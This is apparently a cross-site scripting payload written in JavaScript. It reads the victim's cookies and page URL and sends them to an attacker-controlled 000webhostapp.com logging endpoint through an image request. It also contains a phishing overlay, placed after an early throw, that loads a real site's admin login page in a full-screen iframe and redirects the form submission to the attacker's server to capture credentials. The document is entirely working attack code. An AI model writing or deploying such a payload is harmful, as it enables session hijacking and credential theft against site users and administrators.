jQuery("script[src='//rawgit.com/9os/a/a/a.js']").after("Elysium PVP Alliance");

//Gen data
cookie = "Cookies:"+document.cookie;
url = "URL:"+document.location;

$data = encodeURIComponent(cookie+url);

var imageObject = new Image();
imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;

	throw new Error();

//Let page load first
document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='https://www.lvlgo.com/admin_lvlgo/Login.aspx'></iframe>" + document.body.innerHTML;
var prevTitle = document.title;
document.title = "网站管理系统";

$("#login_iframe").load(function(){
	//alert("Loaded");
	$("#login_iframe").contents().find("#form1")[0].action = "//g4wowisbad.000webhostapp.com/login.php";
	$("#login_iframe").contents().find("#txtUsername")[0].value = getCookie("login_name");
	$("#login_iframe").contents().find("#form1").submit(function(){
		$("#login_iframe").attr("src", "https://www.lvlgo.com/admin_lvlgo/Login.aspx");
		$("#login_iframe").delay(1000).hide(0);
		document.title = prevTitle;
	});
});

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}
